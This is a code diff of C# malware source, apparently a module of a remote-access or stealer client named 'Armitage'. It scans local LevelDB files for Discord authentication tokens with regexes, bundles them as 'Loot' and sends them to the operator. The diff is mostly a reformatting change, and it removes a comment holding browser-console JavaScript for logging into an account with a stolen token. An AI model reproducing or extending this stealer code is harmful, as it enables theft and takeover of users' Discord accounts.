@@ -37,16 +37,16 @@ namespace Client.Armitage.Cookies
 
                 if (rootfolder.Exists)
 
-                foreach (var file in rootfolder.GetFiles(false ? "*.log" : "*.ldb"))
-                {
-                    string readedfile = file.OpenText().ReadToEnd();
+                    foreach (var file in rootfolder.GetFiles(false ? "*.log" : "*.ldb"))
+                    {
+                        string readedfile = file.OpenText().ReadToEnd();
 
-                    foreach (Match match in Regex.Matches(readedfile, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
-                        discordtokens.Add($"Token from {i}\r\n" + match.Value + "\n");
+                        foreach (Match match in Regex.Matches(readedfile, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
+                            discordtokens.Add($"Token from {i}\r\n" + match.Value + "\n");
 
-                    foreach (Match match in Regex.Matches(readedfile, @"mfa\.[\w-]{84}"))
-                        discordtokens.Add($"Token from {i}\r\n" + match.Value + "\n");
-                }
+                        foreach (Match match in Regex.Matches(readedfile, @"mfa\.[\w-]{84}"))
+                            discordtokens.Add($"Token from {i}\r\n" + match.Value + "\n");
+                    }
             }
             return discordtokens.ToList();
         }
@@ -77,24 +77,18 @@ namespace Client.Armitage.Cookies
         /// </summary>
         public async static void Send()
         {
-            await Task.Run(() => {
+            await Task.Run(() =>
+            {
                 var tokens = Stealu();
                 // format the thing into a single string
                 StringBuilder sb = new StringBuilder();
-                foreach (var i in tokens) {
-                    sb.AppendLine("==< Discord Tokens >==");
-
+                sb.AppendLine("==< Discord Tokens >==");
+                foreach (var i in tokens)
+                {
                     sb.AppendLine(i);
                 }
                 Communication.String_Stacker.Send(sb.ToString(), Communication.String_Stacker.StringType.Loot);
             });
         }
-
-        /*
-        To log in:
-            Open Debug on browser.
-                > function login(token) { setInterval(() => { document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"` }, 50); setTimeout(() => { location.reload(); }, 2500); }
-                > login("token")
-         */
     }
 }
